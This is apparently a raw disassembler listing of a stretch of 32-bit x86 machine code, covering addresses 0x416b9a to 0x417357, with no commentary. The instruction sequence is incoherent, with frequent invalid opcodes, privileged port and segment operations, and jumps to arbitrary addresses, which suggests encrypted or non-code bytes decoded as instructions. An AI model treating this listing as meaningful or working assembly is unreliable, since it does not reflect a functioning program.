  416b9a:	sub    BYTE PTR [ebp-0x211df6de],0xb3
  416ba1:	call   0x7605:0xc92434b0
  416ba8:	mov    edx,ecx
  416baa:	repz call 0x40af:0x3e43ea6
  416bb2:	sub    al,BYTE PTR [eax+0x23]
  416bb5:	std    
  416bb6:	jno    0x416c03
  416bb8:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  416bba:	retf   
  416bbb:	aad    0x4c
  416bbd:	test   al,ah
  416bbf:	(bad)  
  416bc0:	mov    dh,0xe2
  416bc2:	nop
  416bc3:	int3   
  416bc4:	add    al,0x78
  416bc6:	dec    esp
  416bc7:	sahf   
  416bc8:	push   esp
  416bc9:	sub    al,0xc9
  416bcb:	stos   BYTE PTR es:[edi],al
  416bcc:	iret   
  416bcd:	add    ecx,DWORD PTR ds:0x952a310
  416bd3:	pusha  
  416bd4:	jo     0x416bc8
  416bd6:	fldcw  WORD PTR [esi+0x2b]
  416bd9:	aam    0x5b
  416bdb:	mov    ah,0x62
  416bdd:	in     eax,0xbf
  416bdf:	or     BYTE PTR [ecx+0x503aee46],al
  416be5:	xchg   esi,eax
  416be6:	jp     0x416b7f
  416be8:	pop    eax
  416be9:	jno    0x416bba
  416beb:	rcl    DWORD PTR [edx+0x22],1
  416bee:	or     ch,BYTE PTR [edi-0x2a0ee413]
  416bf4:	js     0x416c45
  416bf6:	xor    al,0x9
  416bf8:	cmc    
  416bf9:	mov    esp,0x9ca2a44b
  416bfe:	or     eax,0xaf03f4bd
  416c03:	fadd   st(0),st
  416c05:	test   DWORD PTR ss:[ebx-0x66],eax
  416c09:	ds mov esp,0x84564232
  416c0f:	mov    edi,0xe4e5d1e5
  416c14:	loopne 0x416c07
  416c16:	cmp    ebx,ebx
  416c18:	data16 icebp 
  416c1a:	rol    DWORD PTR [edi+0x35a645ec],1
  416c20:	les    edi,FWORD PTR ds:0x39955877
  416c26:	xacquire xchg BYTE PTR [ecx-0x1db92f06],bh
  416c2d:	shl    bl,cl
  416c2f:	jns    0x416c0a
  416c31:	(bad)  [ecx+ecx*8]
  416c34:	push   cs
  416c35:	or     BYTE PTR [ecx],ah
  416c37:	lock iret 
  416c39:	add    BYTE PTR [eax+edx*2],0x79
  416c3d:	jp     0x416cb6
  416c3f:	pop    edi
  416c40:	shl    BYTE PTR [edx+0x77],1
  416c43:	inc    eax
  416c44:	addr16 push ebx
  416c46:	inc    ebx
  416c47:	and    dl,BYTE PTR [esp+edx*1+0x14f1007f]
  416c4e:	jnp    0x416c35
  416c50:	dec    ebp
  416c51:	outs   dx,BYTE PTR ds:[esi]
  416c52:	pop    edi
  416c53:	mov    bh,0xd
  416c55:	imul   esi,DWORD PTR [edi],0xbf801650
  416c5b:	in     eax,dx
  416c5c:	pop    es
  416c5d:	push   esp
  416c5e:	(bad)  
  416c5f:	data16 in al,dx
  416c61:	inc    esp
  416c62:	push   ebp
  416c63:	lods   eax,DWORD PTR ds:[esi]
  416c64:	loope  0x416c63
  416c66:	das    
  416c67:	or     ecx,edx
  416c69:	mov    ds:0x76356dce,eax
  416c6e:	outs   dx,DWORD PTR ds:[esi]
  416c6f:	pop    ss
  416c70:	and    cl,BYTE PTR [edi-0x30e767e4]
  416c76:	or     DWORD PTR [ecx+eiz*4+0x34897d64],ecx
  416c7d:	xor    esi,0x54
  416c80:	loop   0x416cab
  416c82:	mov    ecx,0x962dee4
  416c87:	mov    eax,eax
  416c89:	push   ebx
  416c8a:	push   cs
  416c8b:	sbb    al,0x35
  416c8d:	inc    esi
  416c8e:	popf   
  416c8f:	or     ch,BYTE PTR [ebp+ecx*2-0x80]
  416c93:	jp     0x416c38
  416c95:	inc    ebx
  416c96:	or     eax,0x4ba94a1d
  416c9b:	(bad)  
  416c9c:	push   0x9aa6da21
  416ca1:	dec    ecx
  416ca2:	mov    al,0xf8
  416ca4:	jmp    0x8ebb515b
  416ca9:	repnz sub BYTE PTR [ebx+edi*2+0x15351f4c],dh
  416cb1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416cb2:	icebp  
  416cb3:	in     eax,0x58
  416cb5:	mov    esp,0x21a3cdf2
  416cba:	les    eax,FWORD PTR [ecx]
  416cbc:	sbb    ebx,ebp
  416cbe:	mov    ah,0xd0
  416cc0:	mov    al,0x1c
  416cc2:	jl     0x416cba
  416cc4:	inc    eax
  416cc5:	fxch   st(7)
  416cc7:	adc    esi,ebp
  416cc9:	scas   eax,DWORD PTR es:[edi]
  416cca:	clc    
  416ccb:	loopne 0x416d2a
  416ccd:	xor    DWORD PTR [eax],edi
  416ccf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416cd0:	pop    ebx
  416cd1:	shl    DWORD PTR [ebx],cl
  416cd3:	inc    esi
  416cd4:	aaa    
  416cd5:	jo     0x416cc8
  416cd7:	imul   esi,DWORD PTR [esi-0x6dec2ee2],0x4
  416cde:	call   0xbb194a4
  416ce3:	sahf   
  416ce4:	xchg   edx,edi
  416ce6:	adc    DWORD PTR [ebx+0x75b66f4d],ecx
  416cec:	in     eax,0xd8
  416cee:	add    DWORD PTR [ebx+0x2],edi
  416cf1:	inc    edi
  416cf2:	scas   eax,DWORD PTR es:[edi]
  416cf3:	inc    eax
  416cf4:	mov    edx,ss
  416cf6:	lods   al,BYTE PTR ds:[esi]
  416cf7:	test   BYTE PTR [esi-0x224e406a],dh
  416cfd:	jae    0x416d71
  416cff:	repz push 0x2b
  416d02:	add    ebp,DWORD PTR [edx-0x74]
  416d05:	or     bh,al
  416d07:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416d08:	fiadd  DWORD PTR [esi]
  416d0a:	mov    bl,0xe5
  416d0c:	inc    ecx
  416d0d:	aam    0x50
  416d0f:	mov    edi,0xf282c696
  416d14:	xchg   edx,eax
  416d15:	into   
  416d16:	pusha  
  416d17:	(bad)  
  416d18:	dec    edi
  416d19:	pop    ebx
  416d1a:	xchg   ebp,eax
  416d1b:	loopne 0x416cf7
  416d1d:	jmp    0xe9ef:0x281bde7a
  416d24:	jne    0x416cbc
  416d26:	or     al,0x52
  416d28:	(bad)  
  416d29:	fyl2xp1 
  416d2b:	div    DWORD PTR [edx]
  416d2d:	cli    
  416d2e:	aas    
  416d2f:	pop    ebx
  416d30:	cmp    al,0x90
  416d32:	pop    ss
  416d33:	mov    ds,eax
  416d35:	sbb    al,0x3f
  416d37:	add    dl,BYTE PTR [eax+0x312025cb]
  416d3d:	clc    
  416d3e:	mov    ah,0x7d
  416d40:	pop    ebx
  416d41:	(bad)  
  416d42:	cmp    ebx,DWORD PTR [ebp+0xf6f6fa2]
  416d48:	or     BYTE PTR [ebp+0x7d],0x98
  416d4c:	lds    ebp,FWORD PTR [edi]
  416d4e:	push   es
  416d4f:	sbb    edi,DWORD PTR [ebx]
  416d51:	adc    DWORD PTR [edx+0x450dc64c],0xffffffa7
  416d58:	jp     0x416d2a
  416d5a:	shl    DWORD PTR [ebx+0x20],cl
  416d5d:	jmp    0x6bf047c5
  416d62:	xchg   BYTE PTR ds:0xd5db93ef,dl
  416d68:	push   eax
  416d69:	pop    ebx
  416d6a:	and    BYTE PTR [edi+0x7ecc68d0],cl
  416d70:	mov    esi,0x72efd0d0
  416d75:	jae    0x416d09
  416d77:	daa    
  416d78:	or     BYTE PTR [edi-0x653147f8],al
  416d7e:	mov    ds:0xba234b2c,al
  416d83:	or     BYTE PTR [ecx-0x64],cl
  416d86:	or     esp,DWORD PTR [esi+ebp*4+0x5cdff054]
  416d8d:	xor    al,0x20
  416d8f:	inc    esi
  416d90:	xchg   ebx,eax
  416d91:	and    al,0x93
  416d93:	outs   dx,DWORD PTR ds:[esi]
  416d94:	sbb    al,0x78
  416d96:	jb     0x416d5d
  416d98:	cmp    al,BYTE PTR [ebx-0x48091a70]
  416d9e:	push   0x22206a4a
  416da3:	shl    DWORD PTR es:[eax+0x26],0x72
  416da8:	repz imul eax,DWORD PTR [esi-0x713ec214],0xffffffd8
  416db0:	jecxz  0x416e26
  416db2:	test   DWORD PTR [eax+eiz*4-0x36],esi
  416db6:	into   
  416db7:	adc    eax,0xfa3fbbfe
  416dbd:	cmp    eax,0x2f9ca2f5
  416dc2:	into   
  416dc3:	jg     0x416d9c
  416dc5:	pop    esi
  416dc6:	mov    ds:0x33f40e18,eax
  416dcb:	ja     0x416e3b
  416dcd:	enter  0x6177,0x42
  416dd1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416dd2:	xchg   edx,eax
  416dd3:	arpl   WORD PTR [edx-0x5d],si
  416dd6:	(bad)  
  416dd7:	push   ds
  416dd8:	xor    cl,BYTE PTR [ebp-0x49]
  416ddb:	xchg   cl,ch
  416ddd:	adc    DWORD PTR [eax+0x47d47522],edx
  416de3:	push   ebx
  416de4:	xor    ch,al
  416de6:	and    edx,ebx
  416de8:	push   0x64
  416dea:	pop    edi
  416deb:	push   cs
  416dec:	adc    eax,0x132de61c
  416df1:	xor    BYTE PTR [edx+0x3e9f4db3],ah
  416df7:	in     eax,dx
  416df8:	hlt    
  416df9:	fimul  WORD PTR [ecx]
  416dfb:	add    edi,0x3658f2aa
  416e01:	das    
  416e02:	sbb    eax,0xdae90a9a
  416e07:	sbb    esp,DWORD PTR [ecx+0x11]
  416e0a:	loopne 0x416e57
  416e0c:	mov    ch,BYTE PTR ds:0x63f116ba
  416e12:	xchg   ebp,eax
  416e13:	jmp    0xe075d19e
  416e18:	or     al,0x6
  416e1a:	mov    edx,0x21e2399e
  416e1f:	add    dl,al
  416e21:	out    dx,eax
  416e22:	cdq    
  416e23:	jge    0x416e69
  416e25:	xor    eax,0xcc68485a
  416e2a:	call   0x27798699
  416e2f:	mov    dh,0xd0
  416e31:	(bad)  
  416e33:	ror    bl,0x55
  416e36:	enter  0x9e5b,0xad
  416e3a:	das    
  416e3b:	mov    ah,0x44
  416e3d:	mov    ebp,0x2faf21f7
  416e42:	inc    ecx
  416e43:	xor    bl,BYTE PTR [ebx+0x53]
  416e46:	lea    esp,[ebp-0x49d34abc]
  416e4c:	inc    edx
  416e4d:	ror    BYTE PTR [ecx+0x4],cl
  416e50:	mov    cs,WORD PTR [ebx-0x71515c2]
  416e56:	popa   
  416e57:	mov    ah,BYTE PTR [edi+0x7d35dfea]
  416e5d:	mov    esp,0xc26bf743
  416e62:	(bad)  
  416e63:	daa    
  416e64:	or     BYTE PTR [eax+0x13],cl
  416e67:	jmp    0xf093f40f
  416e6c:	rcl    BYTE PTR [edi-0xd],cl
  416e6f:	jns    0x416e82
  416e71:	sub    eax,0xcc2bb974
  416e76:	pop    edi
  416e77:	loope  0x416e89
  416e79:	rcr    ebp,1
  416e7b:	inc    edi
  416e7c:	cmp    ebp,0x73790914
  416e82:	add    esp,ebx
  416e84:	jmp    0xa9937297
  416e89:	nop
  416e8a:	or     DWORD PTR [eax],0x13
  416e8d:	mov    dl,0x79
  416e8f:	rcl    DWORD PTR [ebx+edi*4],cl
  416e92:	lock push esp
  416e94:	cli    
  416e95:	(bad)  
  416e96:	push   ebp
  416e97:	mov    bl,BYTE PTR [esi-0x72da8c77]
  416e9d:	cli    
  416e9e:	jno    0x416edf
  416ea0:	or     DWORD PTR [eax-0x46],0x42
  416ea4:	inc    edx
  416ea5:	cmp    al,ch
  416ea7:	aaa    
  416ea8:	mov    esp,0x3ce83167
  416ead:	sbb    BYTE PTR [ecx+0x38],0x20
  416eb1:	and    eax,0x194c9a12
  416eb6:	adc    DWORD PTR [edi+0x5d],0x583ed1d6
  416ebd:	xchg   esp,eax
  416ebe:	xor    ah,dh
  416ec0:	imul   esi,DWORD PTR [eax+eiz*4],0x3a0452c0
  416ec7:	(bad)  
  416ec8:	and    dh,BYTE PTR [eax+0x68f7167c]
  416ece:	pop    es
  416ecf:	inc    esi
  416ed0:	adc    al,BYTE PTR [ecx]
  416ed2:	call   0x2b309fd8
  416ed7:	lock nop
  416ed9:	pop    es
  416eda:	mov    ah,0xbe
  416edc:	into   
  416edd:	dec    eax
  416ede:	ins    BYTE PTR es:[edi],dx
  416edf:	into   
  416ee0:	(bad)  
  416ee1:	int3   
  416ee2:	les    edi,FWORD PTR [edx-0x4f]
  416ee5:	sub    eax,0x132a78f5
  416eea:	loopne 0x416f5a
  416eec:	outs   dx,BYTE PTR ds:[esi]
  416eed:	frstor [edi+edi*2]
  416ef0:	fldenv [esi+0x11af7bd5]
  416ef6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416ef7:	jmp    0x416f3b
  416ef9:	addr16 push edx
  416efb:	xchg   esp,eax
  416efc:	cmc    
  416efd:	outs   dx,DWORD PTR ds:[esi]
  416efe:	fldcw  WORD PTR [ebp-0x6b8f486]
  416f04:	inc    edi
  416f05:	or     bh,al
  416f07:	ret    
  416f08:	mov    edx,0x5efe4e72
  416f0d:	mov    eax,ecx
  416f0f:	sub    eax,0xda471c
  416f14:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416f15:	hlt    
  416f16:	in     eax,dx
  416f17:	lods   eax,DWORD PTR ds:[esi]
  416f18:	aad    0x89
  416f1a:	mov    esp,0x716122eb
  416f1f:	jnp    0x416eb5
  416f21:	xor    ah,ah
  416f23:	adc    DWORD PTR [esi],ecx
  416f25:	dec    edx
  416f26:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416f27:	sbb    al,0x46
  416f29:	and    ebp,edx
  416f2b:	pushw  0xffdf
  416f2e:	add    al,0x95
  416f30:	out    dx,eax
  416f31:	lahf   
  416f32:	(bad)  
  416f33:	pushf  
  416f34:	jo     0x8fa1c6d0
  416f3a:	add    BYTE PTR [edi],bl
  416f3c:	dec    eax
  416f3d:	in     al,dx
  416f3e:	xchg   ebp,eax
  416f3f:	jecxz  0x416f65
  416f41:	xor    al,0xb6
  416f43:	pop    ebx
  416f44:	xor    ch,BYTE PTR [ecx]
  416f46:	or     al,0x66
  416f48:	retf   
  416f49:	xchg   ecx,eax
  416f4a:	pop    edx
  416f4b:	or     DWORD PTR [edx+0x72706e07],eax
  416f51:	dec    edx
  416f52:	mov    bh,0x1
  416f54:	push   ebp
  416f55:	test   DWORD PTR [si+0x21],esp
  416f59:	outs   dx,DWORD PTR ds:[esi]
  416f5a:	inc    edx
  416f5b:	aam    0xb4
  416f5d:	cld    
  416f5e:	in     al,dx
  416f5f:	(bad)  
  416f60:	lds    ecx,FWORD PTR [ebp+0x6f]
  416f63:	out    dx,al
  416f64:	mov    dh,0x66
  416f66:	push   edi
  416f67:	pop    ss
  416f68:	pop    esp
  416f69:	xlat   BYTE PTR ds:[ebx]
  416f6a:	rcl    DWORD PTR [edx+0x21],cl
  416f6d:	bound  esi,QWORD PTR [esi]
  416f6f:	push   0x6d
  416f71:	fld    TBYTE PTR [ecx-0x59]
  416f74:	push   0x4ee22868
  416f79:	jno    0x416f3e
  416f7b:	js     0x416f2b
  416f7d:	mov    cl,0x9d
  416f7f:	pusha  
  416f80:	pop    ss
  416f81:	rcl    BYTE PTR [ebx],cl
  416f83:	stos   DWORD PTR es:[edi],eax
  416f84:	push   cs
  416f85:	imul   BYTE PTR [edi-0x42]
  416f88:	mov    ecx,0xf693c4d0
  416f8d:	or     DWORD PTR [esi],edi
  416f8f:	bound  ebx,QWORD PTR [ebp-0x318c5703]
  416f95:	jns    0x416fd4
  416f97:	sbb    eax,0x17ac7722
  416f9c:	prefetch BYTE PTR [edi-0x7f]
  416fa0:	retf   
  416fa1:	xchg   esp,eax
  416fa2:	shl    ah,cl
  416fa4:	adc    al,BYTE PTR [ecx]
  416fa6:	jb     0x416fa5
  416fa8:	test   BYTE PTR [eax-0x7c5e38a9],bl
  416fae:	push   ecx
  416faf:	mov    BYTE PTR [ebx],dh
  416fb1:	outs   dx,DWORD PTR ds:[esi]
  416fb2:	sbb    eax,DWORD PTR [edx+eiz*2-0x49b264bf]
  416fb9:	push   cs
  416fba:	test   DWORD PTR [esi],edi
  416fbc:	add    esi,DWORD PTR [esi]
  416fbe:	mov    esp,0x33bd89b0
  416fc3:	pop    eax
  416fc4:	je     0x416fda
  416fc6:	dec    eax
  416fc7:	jl     0x41702a
  416fc9:	ficomp DWORD PTR ds:0x5fb6bb9f
  416fcf:	jns    0x416fef
  416fd1:	int3   
  416fd2:	fldenv [edx]
  416fd4:	scas   eax,DWORD PTR es:[edi]
  416fd5:	xor    al,0xa5
  416fd7:	das    
  416fd8:	int3   
  416fd9:	sbb    eax,edx
  416fdb:	jmp    0x416fdf
  416fdd:	mov    gs,WORD PTR [edx-0x70606e1]
  416fe3:	push   ss
  416fe4:	inc    ecx
  416fe5:	ins    BYTE PTR es:[edi],dx
  416fe6:	call   0xbc7381b7
  416feb:	aas    
  416fec:	jb     0x41702c
  416fee:	push   esp
  416fef:	fstp   QWORD PTR [ebp-0x54]
  416ff2:	cdq    
  416ff3:	out    dx,eax
  416ff4:	dec    ecx
  416ff5:	icebp  
  416ff6:	inc    esi
  416ff7:	cmp    eax,0xfa9dea5c
  416ffc:	adc    edi,DWORD PTR [ebp-0x6ec758ee]
  417002:	inc    BYTE PTR [ebp+0x630aacea]
  417008:	mov    bl,0x94
  41700a:	arpl   sp,bx
  41700c:	leave  
  41700d:	mov    WORD PTR [ebx],gs
  41700f:	xor    BYTE PTR [edx-0x478c3524],bl
  417015:	cli    
  417016:	nop
  417017:	cwde   
  417018:	cmc    
  417019:	rcr    DWORD PTR [esi+edi*8+0x2ecdafc8],1
  417020:	out    dx,eax
  417021:	xor    BYTE PTR [eax],dl
  417023:	mov    ds:0x758e6114,eax
  417028:	ins    BYTE PTR es:[edi],dx
  417029:	dec    esi
  41702a:	iret   
  41702b:	stos   DWORD PTR es:[edi],eax
  41702c:	xor    al,0x38
  41702e:	cmp    al,0x2b
  417030:	inc    ebp
  417031:	(bad)  
  417032:	fdiv   st(2),st
  417034:	enter  0x9870,0xdd
  417038:	push   cs
  417039:	fs std 
  41703b:	sbb    eax,0x2bd61d6b
  417040:	in     al,0xf7
  417042:	iret   
  417043:	and    dl,BYTE PTR [ebp-0x47]
  417046:	xchg   ebp,eax
  417047:	xor    al,BYTE PTR [edx-0x6cdab625]
  41704d:	or     eax,0x4b3d1322
  417052:	inc    ebp
  417053:	outs   dx,DWORD PTR ds:[esi]
  417054:	xchg   ebp,eax
  417055:	sbb    eax,0xb6cbccb5
  41705a:	ja     0x417075
  41705c:	hlt    
  41705d:	push   0x152ac87e
  417062:	sub    ebx,ebx
  417064:	add    BYTE PTR [eax+ebp*4],cl
  417067:	jb     0x417004
  417069:	imul   BYTE PTR [edx+0x2c]
  41706c:	jmp    0x878:0x398a2e5c
  417073:	ret    
  417074:	enter  0xd5aa,0xb4
  417078:	inc    esi
  417079:	call   0xbd7c:0xc7e1887b
  417080:	aaa    
  417081:	mov    al,ds:0x9c8921dc
  417086:	add    ch,BYTE PTR es:[esi+esi*1+0x52]
  41708b:	es cdq 
  41708d:	ret    
  41708e:	mov    dl,0x6f
  417090:	mov    ebx,0x4019b3c
  417095:	sbb    esi,ecx
  417097:	inc    ebx
  417098:	cmp    BYTE PTR [esi+eax*2+0x44],0x10
  41709d:	imul   edx,DWORD PTR es:[edx-0x47],0xfaf95e59
  4170a5:	inc    ecx
  4170a6:	popa   
  4170a7:	pushf  
  4170a8:	(bad)  
  4170a9:	into   
  4170aa:	push   ecx
  4170ab:	inc    esp
  4170ac:	cmp    BYTE PTR [ecx+0x35ffa6b4],ch
  4170b2:	cmp    al,0xfa
  4170b4:	ds hlt 
  4170b6:	test   al,0x37
  4170b8:	out    dx,eax
  4170b9:	lahf   
  4170ba:	fsub   DWORD PTR [esi+0x19]
  4170bd:	push   ecx
  4170be:	pop    edx
  4170bf:	xchg   edx,eax
  4170c0:	xlat   BYTE PTR ds:[ebx]
  4170c1:	ja     0x417071
  4170c3:	rol    BYTE PTR [esi+eiz*8+0x79802912],0x1a
  4170cb:	in     eax,0x1e
  4170cd:	push   cs
  4170ce:	iret   
  4170cf:	xor    bl,BYTE PTR [ebx+ebx*1-0x33]
  4170d3:	shl    dh,1
  4170d5:	ss jle 0x417071
  4170d8:	jmp    0x417111
  4170da:	sub    DWORD PTR [esi+0x1e5cb95d],edi
  4170e0:	outs   dx,DWORD PTR ds:[esi]
  4170e1:	sbb    BYTE PTR [eax],ah
  4170e3:	cmp    ebp,DWORD PTR [eax+0x74]
  4170e6:	xchg   edi,eax
  4170e7:	jl     0x417103
  4170e9:	mov    DWORD PTR [edx],edx
  4170eb:	inc    esp
  4170ec:	fstp   TBYTE PTR [eax]
  4170ee:	adc    al,0x19
  4170f0:	je     0x417167
  4170f2:	add    eax,0x2648d3ca
  4170f7:	repz dec edi
  4170f9:	lods   al,BYTE PTR ds:[esi]
  4170fa:	(bad)  
  4170fb:	mov    bl,0xc4
  4170fd:	pop    esp
  4170fe:	lds    ebp,FWORD PTR [eax]
  417100:	call   0x6ae0697a
  417105:	imul   edx,ecx,0x5f
  417108:	shl    BYTE PTR [ebx+0x23f7e1ae],1
  41710e:	aad    0xd2
  417110:	call   0xc508abe3
  417115:	mov    BYTE PTR ds:0x865ef54f,0xc4
  41711c:	inc    esi
  41711d:	ds sbb ecx,0x15999444
  417124:	cmp    al,0xcc
  417126:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417127:	xchg   al,al
  417129:	dec    eax
  41712a:	inc    edx
  41712b:	pop    es
  41712c:	lds    ebx,FWORD PTR ds:[eax+0x1fd43554]
  417133:	data16 mov dh,0xae
  417136:	hlt    
  417137:	xchg   DWORD PTR [ebx+0x5],ebp
  41713a:	pop    eax
  41713b:	xchg   edi,eax
  41713c:	aam    0xae
  41713e:	outs   dx,DWORD PTR ds:[esi]
  41713f:	xor    al,0xe6
  417141:	(bad)  
  417142:	inc    BYTE PTR [edx]
  417144:	or     BYTE PTR [edx-0x78],cl
  417147:	inc    ebp
  417148:	(bad)  
  41714a:	add    DWORD PTR [ebx-0x6fbfe5c4],eax
  417150:	loop   0x417177
  417152:	imul   ebp,DWORD PTR [edi],0x74
  417155:	push   edi
  417156:	mov    ds:0x3a926be2,al
  41715b:	popf   
  41715c:	pusha  
  41715d:	xor    al,0x6
  41715f:	repnz icebp 
  417161:	xchg   BYTE PTR [ebx+0x3f],bl
  417164:	out    dx,al
  417165:	mov    ?,WORD PTR [esi+0x8de7433]
  41716b:	shl    BYTE PTR [ecx-0x503b0f35],1
  417171:	mov    esi,0x82c35ef
  417176:	sbb    bh,dh
  417178:	pop    esi
  417179:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41717a:	pushf  
  41717b:	gs mov eax,0xffedf609
  417181:	xchg   esp,eax
  417182:	nop
  417183:	ins    BYTE PTR es:[edi],dx
  417184:	mov    dl,0x4a
  417186:	rcr    BYTE PTR ds:0xc707528f,1
  41718c:	mov    ecx,0xa76a8890
  417191:	scas   eax,DWORD PTR es:[edi]
  417192:	je     0x4171e4
  417194:	pop    esi
  417195:	pushf  
  417196:	mov    ah,0x94
  417198:	jl     0x417208
  41719a:	cdq    
  41719b:	jmp    0xf6c7106
  4171a0:	mov    edi,DWORD PTR [edx]
  4171a2:	ins    BYTE PTR es:[edi],dx
  4171a3:	rcl    BYTE PTR [ebp-0x139b46f0],0xa0
  4171aa:	inc    edx
  4171ab:	xchg   esi,eax
  4171ac:	dec    eax
  4171ad:	ret    
  4171ae:	inc    esp
  4171af:	aaa    
  4171b0:	pop    ecx
  4171b1:	in     al,dx
  4171b2:	jg     0x417206
  4171b4:	cdq    
  4171b5:	pop    ss
  4171b6:	out    0x64,eax
  4171b8:	pop    esp
  4171b9:	inc    edx
  4171ba:	fild   QWORD PTR [eax]
  4171bc:	dec    eax
  4171bd:	idiv   ah
  4171bf:	stc    
  4171c0:	lds    ecx,FWORD PTR [edi-0x16]
  4171c3:	pop    esp
  4171c4:	stc    
  4171c5:	jge    0x4171db
  4171c7:	sub    eax,0x5e1671c8
  4171cc:	push   ds
  4171cd:	stc    
  4171ce:	jae    0x4171ad
  4171d0:	mov    dl,0x24
  4171d2:	dec    edi
  4171d3:	stc    
  4171d4:	mov    edi,0xc6f74c96
  4171d9:	push   es
  4171da:	push   esp
  4171db:	call   0x15e39cc8
  4171e0:	jge    0x417164
  4171e2:	xchg   BYTE PTR [ebx-0x1e2fc4f],ch
  4171e8:	sahf   
  4171e9:	adc    al,0x9d
  4171eb:	loop   0x417187
  4171ed:	push   esp
  4171ee:	dec    edx
  4171ef:	push   eax
  4171f0:	mov    eax,cs
  4171f2:	mov    ch,0x5e
  4171f4:	fnstenv [ebp-0x6a]
  4171f7:	gs hlt 
  4171f9:	cli    
  4171fa:	div    ah
  4171fc:	scas   eax,DWORD PTR es:[edi]
  4171fd:	fprem  
  4171ff:	cmp    eax,0x1877db86
  417204:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417205:	aas    
  417206:	adc    al,0x12
  417208:	mul    BYTE PTR [ebx+0x4e3f2abd]
  41720e:	in     al,0x72
  417210:	mov    ds:0x7b3d7bd6,al
  417215:	(bad)  
  417216:	lahf   
  417217:	jne    0x417219
  417219:	clc    
  41721a:	mov    ah,0xaa
  41721c:	dec    ebp
  41721d:	hlt    
  41721e:	mov    ah,0xe2
  417220:	bound  ecx,QWORD PTR [ebp-0x67]
  417223:	aad    0xe7
  417225:	and    ecx,ecx
  417227:	jp     0x4171b3
  417229:	xchg   esp,ebp
  41722b:	xchg   edx,eax
  41722c:	mov    edx,0x17198706
  417231:	mov    eax,0xcc34db44
  417236:	add    eax,0xf11d3ec4
  41723b:	dec    esi
  41723c:	jle    0x417290
  41723e:	(bad)  
  41723f:	adc    al,0xc6
  417241:	stos   DWORD PTR es:[edi],eax
  417242:	jle    0x41728e
  417244:	push   cs
  417245:	mov    dh,0xe5
  417247:	inc    ecx
  417248:	cmp    dh,ah
  41724a:	hlt    
  41724b:	push   0x17
  41724d:	cmp    DWORD PTR [ebx],ecx
  41724f:	mov    cl,al
  417251:	jne    0x4171e7
  417253:	jmp    0x29847fdf
  417258:	imul   ecx,ecx,0xffffffba
  41725b:	sbb    DWORD PTR [edx+eax*2-0x64],esi
  41725f:	ss sub eax,0x7556fce4
  417265:	cmp    DWORD PTR [edi-0x48138e59],esi
  41726b:	nop
  41726c:	not    BYTE PTR [eax-0x779ae9a8]
  417272:	dec    DWORD PTR [edi]
  417274:	jo     0x4172d9
  417276:	ret    
  417277:	add    al,dl
  417279:	aam    0x1b
  41727b:	sub    BYTE PTR [eax+0x68],0x3c
  41727f:	in     al,dx
  417280:	int    0x2b
  417282:	pop    edx
  417283:	push   es
  417284:	mov    WORD PTR [edx],ds
  417286:	push   cs
  417287:	pushf  
  417288:	fwait
  417289:	and    DWORD PTR [edx],eax
  41728b:	sub    DWORD PTR ds:[edx+0x39],eax
  41728f:	fadd   DWORD PTR [ecx+0x23db5949]
  417295:	(bad)  
  417298:	sbb    eax,0x504ce908
  41729d:	bnd ret 0x5734
  4172a1:	mov    ds,WORD PTR [eax-0x1601c79a]
  4172a7:	cli    
  4172a8:	push   0xe06572b3
  4172ad:	adc    dl,dh
  4172af:	ret    
  4172b0:	in     eax,dx
  4172b1:	mov    ah,0x8b
  4172b3:	pop    ds
  4172b4:	jle    0x417237
  4172b6:	sub    eax,0x1a435ab8
  4172bb:	jns    0x4172b8
  4172bd:	out    0x30,al
  4172bf:	test   eax,0x9a47e410
  4172c4:	sub    al,0x26
  4172c6:	(bad)  
  4172c7:	es inc eax
  4172c9:	cli    
  4172ca:	call   FWORD PTR [ebx+ebp*1+0x2c]
  4172ce:	ins    BYTE PTR es:[edi],dx
  4172cf:	push   cs
  4172d0:	out    dx,eax
  4172d1:	dec    edi
  4172d2:	iret   
  4172d3:	xchg   ebx,eax
  4172d4:	aam    0xe7
  4172d6:	add    ebp,ebp
  4172d8:	fsub   DWORD PTR [edx]
  4172da:	xor    bh,BYTE PTR es:[eax]
  4172dd:	cdq    
  4172de:	mov    ah,0x94
  4172e0:	xchg   esp,eax
  4172e1:	lods   al,BYTE PTR ds:[esi]
  4172e2:	out    0xf4,al
  4172e4:	or     BYTE PTR [ecx-0x3d3bcee2],dh
  4172ea:	cs sti 
  4172ec:	and    ebp,ecx
  4172ee:	xchg   edx,eax
  4172ef:	mul    bl
  4172f1:	push   edx
  4172f2:	aam    0x9e
  4172f4:	std    
  4172f5:	xlat   BYTE PTR ds:[ebx]
  4172f6:	rol    BYTE PTR [esi+0x74fdfcc9],cl
  4172fc:	dec    edi
  4172fd:	adc    DWORD PTR [edi],ebx
  4172ff:	xchg   edi,eax
  417300:	fsub   st,st(2)
  417302:	pushf  
  417303:	hlt    
  417304:	lods   al,BYTE PTR ds:[esi]
  417305:	and    BYTE PTR [edi-0x3d],ch
  417308:	jp     0x4172c6
  41730a:	mov    dh,BYTE PTR [edi+0x6390d65d]
  417310:	imul   eax,DWORD PTR [eax-0xa],0xffffff95
  417314:	mov    ss,esp
  417316:	push   ecx
  417317:	xor    eax,0x95abd281
  41731c:	and    al,0xb4
  41731e:	fs push ds
  417320:	je     0x41733d
  417322:	or     DWORD PTR [eax+0x7f34725d],esi
  417328:	push   edi
  417329:	cs pop esp
  41732b:	(bad)  
  41732d:	frndint 
  41732f:	es popa 
  417331:	inc    esi
  417332:	fidivr WORD PTR [esi-0x4d3acaf3]
  417338:	sahf   
  417339:	dec    ebx
  41733a:	or     dl,0x46
  41733d:	adc    dl,BYTE PTR [ebx+0x2a3ae2fa]
  417343:	in     al,dx
  417344:	mov    bh,0xd3
  417346:	jnp    0x41737f
  417348:	ds stc 
  41734a:	bound  eax,QWORD PTR [eax+0x314ca81f]
  417350:	lods   al,BYTE PTR ds:[esi]
  417351:	imul   edx,DWORD PTR [esi],0x3413f944
  417357:	iret   
